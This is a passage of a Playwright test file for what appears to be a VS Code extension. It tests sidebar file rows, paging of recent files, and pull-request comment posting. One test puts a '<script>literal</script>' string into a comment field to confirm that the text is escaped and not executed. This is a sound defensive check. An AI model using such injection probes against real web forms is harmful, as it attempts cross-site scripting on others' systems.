  await page.evaluate(()=>window.dispatchEvent(new MessageEvent('message',{data:{type:'state',state:{sessions:[{id:'one',cwd:'/project/demo'}],selectedSessionId:'one',files:[
    {id:'readme',path:'/project/demo/_script_outputs/demo_run/README.md',label:'README.md',pinned:true,modified:Date.now()-5*60000},
    {id:'py',path:'/project/demo/_script_outputs/demo_run/build_report.py',label:'build_report.py'},
    {id:'csv',path:'/project/demo/_script_outputs/demo_run/results.csv',label:'results.csv'},
    {id:'long',path:'/project/demo/deep/reports/daily/very_long_reconciliation_report_for_october.csv',label:'very_long_reconciliation_report_for_october.csv'},
  ],draft:{}}}})));
  assert.equal(await page.locator('.file-path').first().textContent(),'_script_outputs/demo_run');
  assert.equal(await page.locator('.file-path').last().textContent(),'…/reports/daily');
  assert.equal(await page.locator('.file-modified').textContent(),'5 min ago');
  assert.match(await page.locator('.file-modified').getAttribute('title'),/^Last modified: /);
  assert.equal(await page.locator('.material-python').count(),1);
  assert.equal(await page.locator('.material-table').count(),2);
  const output=tempDir('file-row-layout');
  for(const width of [220,280,420]){
    await page.setViewportSize({width,height:700});
    await page.mouse.move(width-1,699);
    const geometry=await page.locator('.file-item').nth(1).evaluate(row=>({row:row.clientWidth,label:row.querySelector('.item-label').clientWidth,tools:getComputedStyle(row.querySelector('.file-actions')).display,overflow:document.documentElement.scrollWidth>innerWidth}));
    assert.ok(geometry.label>=geometry.row-40,JSON.stringify(geometry));
    assert.equal(geometry.tools,'none');assert.equal(geometry.overflow,false);
    await page.getByRole('button',{name:'Open build_report.py',exact:true}).focus();
    assert.equal(await page.locator('.file-item').nth(1).getByRole('button',{name:'Download file',exact:true}).isVisible(),true);
    await page.getByRole('button',{name:'Open build_report.py',exact:true}).evaluate(el=>el.blur());
    await page.screenshot({path:path.join(output,`files-${width}.png`)});
  }
  await page.evaluate(()=>{for(const [key,value] of Object.entries({'--vscode-sideBar-background':'#fff','--vscode-foreground':'#222','--vscode-descriptionForeground':'#666'}))document.body.style.setProperty(key,value);});
  await page.screenshot({path:path.join(output,'files-light.png')});
  const pagedState={sessions:[{id:'one',cwd:'/project'},{id:'two',cwd:'/other'}],selectedSessionId:'one',draft:{},files:[
    ...Array.from({length:25},(_,i)=>({id:`pin${i}`,path:`/project/pin${i}.md`,label:`pin${i}.md`,pinned:true})),
    ...Array.from({length:100},(_,i)=>({id:`recent${i}`,path:`/project/recent${i}.csv`,label:`recent${i}.csv`}))
  ]};
  const update=state=>page.evaluate(state=>window.dispatchEvent(new MessageEvent('message',{data:{type:'state',state}})),state);
  await update(pagedState);
  assert.equal(await page.locator('.file-item').count(),45,'25 pins plus 20 recents');
  assert.equal(await page.locator('.recent-count').textContent(),'20 of 100 recent files');
  await page.getByRole('button',{name:'Show 20 more',exact:true}).click();
  assert.equal(await page.locator('.file-item').count(),65);
  await page.getByRole('button',{name:'Open recent20.csv',exact:true}).focus();
  await page.evaluate(()=>window.focusedFile=document.activeElement);
  await update({...pagedState,files:pagedState.files.map(file=>({...file}))});
  assert.equal(await page.evaluate(()=>window.focusedFile===document.activeElement&&window.focusedFile.isConnected),true,'unchanged polling preserves the focused row');
  assert.equal(await page.locator('.file-item').count(),65,'polling preserves expansion');
  for(let i=0;i<3;i++)await page.getByRole('button',{name:'Show 20 more',exact:true}).click();
  assert.equal(await page.locator('.file-item').count(),125);
  assert.equal(await page.getByRole('button',{name:'Show 20 more',exact:true}).count(),0);
  await page.getByRole('button',{name:'Show fewer',exact:true}).click();
  assert.equal(await page.locator('.file-item').count(),45);
  await page.getByRole('button',{name:'Show 20 more',exact:true}).click();
  await update({...pagedState,selectedSessionId:'two'});
  assert.equal(await page.locator('.file-item').count(),45,'session switch resets expansion');
  await update({...pagedState,files:pagedState.files.slice(0,48)});
  await page.getByRole('button',{name:'Show 3 more',exact:true}).click();
  assert.equal(await page.locator('.file-item').count(),48,'partial final page');
  await update({...pagedState,files:pagedState.files.slice(0,25)});
  assert.equal(await page.locator('.recent-controls').count(),0,'no more control for pins alone');

});

test('browser: PR comment keeps failed drafts and clears only confirmed posts',{skip:!executablePath},async t=>{
 const {chromium}=require('playwright');const browser=await chromium.launch({executablePath});t.after(()=>browser.close());
 const page=await browser.newPage(),messages=[];
 await page.exposeFunction('recordMessage',message=>messages.push(message));
 await page.addInitScript(()=>{let state;window.acquireVsCodeApi=()=>({getState:()=>state,setState:value=>{state=value;},postMessage:message=>window.recordMessage(message)});});
 const markup=require('../src/pull-request.cjs').html({number:12,title:'Example',body:'',comments:[]},[]);
 await page.route('**/*',route=>route.request().url()==='http://agent-glue.test/'?route.fulfill({contentType:'text/html',body:markup}):route.abort());
 await page.goto('http://agent-glue.test/');
 await page.getByRole('button',{name:'Leave comment',exact:true}).click();
 assert.equal(await page.locator('#comment-body').evaluate(node=>node===document.activeElement),true);
 await page.locator('#comment-body').fill('Please adjust this.\n\n<script>literal</script>');
 await page.locator('#post-comment').click();
 await page.waitForFunction(()=>document.getElementById('post-comment').disabled);
 assert.equal(messages.length,1);assert.equal(messages[0].type,'postComment');
 await page.evaluate(()=>window.postMessage({type:'commentResult',ok:false,error:'Try again'},'*'));
 await page.waitForFunction(()=>!document.getElementById('comment-body').disabled);
 assert.match(await page.locator('#comment-body').inputValue(),/Please adjust/);
 await page.locator('#post-comment').click();
 await page.evaluate(()=>window.postMessage({type:'commentResult',ok:true},'*'));
 await page.waitForFunction(()=>document.getElementById('comment-body').value==='');
 assert.match(await page.locator('#posted-comments').textContent(),/<script>literal<\/script>/);
 assert.equal(await page.locator('#posted-comments script').count(),0);
});

test('browser: prepared reviews allow local comments and a review-all request',{skip:!executablePath},async t=>{
 const {chromium}=require('playwright');const browser=await chromium.launch({executablePath});t.after(()=>browser.close());
 const page=await browser.newPage(),messages=[];
 await page.exposeFunction('recordMessage',message=>messages.push(message));
 await page.addInitScript(()=>{window.acquireVsCodeApi=()=>({getState:()=>undefined,setState(){},postMessage:message=>window.recordMessage(message)});});
 const markup=require('../src/pull-request.cjs').html({local:true,title:'Proposal',body:'',comments:[]},[]);
 await page.route('**/*',route=>route.request().url()==='http://agent-glue.test/'?route.fulfill({contentType:'text/html',body:markup}):route.abort());
 await page.goto('http://agent-glue.test/');
 await page.getByRole('button',{name:'Leave comment',exact:true}).click();
 await page.locator('#comment-body').fill('Change this before pushing.');
 await page.getByRole('button',{name:'Save local comment',exact:true}).click();
 assert.equal(messages[0].type,'postComment');
 await page.evaluate(()=>window.postMessage({type:'commentResult',ok:true,local:true},'*'));
 await page.waitForFunction(()=>document.getElementById('comment-status').textContent==='Comment saved locally.');
 await page.getByRole('button',{name:'Review all local feedback',exact:true}).click();
 assert.equal(messages.at(-1).type,'reviewFeedback');
 assert.equal(await page.locator('#github').isVisible(),false);
});

test('sidebar keeps activity out of the files toolbar',()=>{
 const html=require('../src/views.cjs').renderSidebar({nonce:'test',cspSource:'https://agent-glue.test',scriptUri:'https://agent-glue.test/companion.js',styleUri:'https://agent-glue.test/companion.css'});
 assert.doesNotMatch(html,/activity-strip|activity-summary|activity-list/);
 assert.match(html,/id="file-controls"/);
});
